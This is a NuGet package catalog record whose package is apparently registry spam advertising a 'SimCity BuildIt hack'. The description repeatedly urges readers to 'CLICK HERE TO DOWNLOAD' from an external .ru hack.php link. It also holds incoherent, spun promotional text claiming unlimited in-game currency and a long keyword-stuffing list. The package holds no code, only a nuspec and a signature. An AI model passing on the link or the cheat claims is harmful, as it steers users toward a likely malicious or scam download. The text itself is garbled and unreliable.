{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.00.06/_simcity-buildit-hack-working-2022-version-fcz.4.6.64.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "e328c68f-33cd-40af-bf72-1ad6b2168fbd",
  "catalog:commitTimeStamp": "2022-01-26T11:00:06.0292463Z",
  "created": "2022-01-26T10:53:16.993Z",
  "description": "# _SimCity Buildit Hack Working 2022 Version fcz\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://6.bltadwin.ru/hack.php](http://6.bltadwin.ru/hack.php)\n\n\nSimCity BuildIt Cheats often carry monsters to the end on battlefields, but once they are ex- hausted, they will not beable to return to. An unknown developer develops this game for the gamer who loves to play SimCity fully unlocked. With this hacked version you will get unlimited. One of the best simulator game for Android is SimCity BuildIt. So if you have downloaded this MOD APK hack from above.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://6.bltadwin.ru/hack.php](http://6.bltadwin.ru/hack.php)\n\n · Hack/Cheats SimCity BuildIt. Hack Version: Works for non-jailbreak  jailbreak devices. Hack works with you in this version and future versions of the game.  · How come? Simply because you’ll be able to employ SimCity buildit hack to stay away from the need to ante up your hard gained dollars. There’s no require looking for lessons precisely ways to hack simcity buildit oneself. All you’ll might like to do is start taking a simcity buildit cheats which have been obtainable. download Simcity Buildit Hack is a program that allows you to add and simcash simoleons. Through this program, you will be better than others!\n\nsimcity buildit hack ios, simcity buildit hack ios 2021, simcity buildit hack 2021, simcity buildit hack android, simcity buildit hack reddit, simcity buildit hack apk, simcity buildit hack apk 2021, simcity buildit hack eazycheat, simcity buildit hack app, simcity buildit hack apk dinero infinito 2021, simcity buildit hack android 2021, simcity buildit hack apk ultima versión, simcity buildit hack apk download, the simcity buildit cheat, is there a simcity buildit hack that actually works, how do you get unlimited money on simcity buildit, can you cheat on simcity buildit, can i hack simcity buildit, simcity buildit hack bluestacks, simcity buildit hack buildings, simcity buildit cheats bluestacks, simcity build it bluestacks hack, simcity buildit bulldozer cheat, simcity buildit bluestacks cheat engine, can simcity buildit be hacked, gaming buddy.org/simcity-buildit-hack, hacking simcity buildit, simcity buildit hack coin  cash, simcity buildit hack cydia, simcity buildit hack cydia 2020, simcity buildit hack cash android, simcity buildit cheat codes, simcity buildit cheat codes android, simcity buildit cheat codes 2020, simcity buildit cheat codes iphone, simcity buildit hack download, simcity buildit hack download ios, simcity buildit cheats download free, simcity buildit cheats download, simcity buildit hack apk download no survey, simcity buildit hack 2021 download, simcity buildit hack pc download, simcity buildit hack ipa download, simcity buildit hack eazycheat 2020, simcity buildit hack.exe free download, simcity buildit cheat engine, simcity buildit energy hack, simcity buildit cheat engine bluestacks, simcity buildit cheat engine pc, simcity buildit cheats expansion, simcity buildit hack for ios, simcity buildit hack file, simcity buildit hack for pc, simcity buildit hack file ios, simcity buildit hack free download ios, simcity buildit hack for ipad, simcity buildit hack filza, simcity buildit cheats for android, simcity buildit hack generator, simcity buildit hack game, simcity buildit hack game guardian, simcity buildit hack gg, simcity buildit hack gratuit, simcity buildit cheat generator, simcity buildit cheats golden keys, simcity buildit cheats get more simcash, simcity buildit online generator, simcity buildit hack happymod, simcity buildit cheat how, simcity buildit hack no human verification 2020, simcity buildit hack no human verification 2021, simcity buildit hack no human verification no download, simcity buildit hack without human verification, simcity buildit hack no human verification, simcity buildit hack no human verification 2019, hack for simcity buildit, hack for simcity buildit ios, simcity buildit hack",
  "id": "_SimCity-Buildit-Hack-Working-2022-Version-fcz",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T10:57:23.837Z",
  "listed": true,
  "packageHash": "HjNWKXW5YNE+l97+kHlelSkLpPKbh1Tf0BOZ0KDsaF+svEh44jtkjvLR3I4J2mUNiONjltj+qD5wJRrrbmqqBw==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11507,
  "published": "2022-01-26T10:53:16.993Z",
  "requireLicenseAcceptance": false,
  "title": "_SimCity-Buildit-Hack-Working-2022-Version-fcz",
  "verbatimVersion": "4.6.64",
  "version": "4.6.64",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.00.06/_simcity-buildit-hack-working-2022-version-fcz.4.6.64.json#eiuyvfcihn.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1377,
      "fullName": "eiuyvfcihn.nuspec",
      "length": 4470,
      "name": "eiuyvfcihn.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.00.06/_simcity-buildit-hack-working-2022-version-fcz.4.6.64.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9470,
      "fullName": ".signature.p7s",
      "length": 9470,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}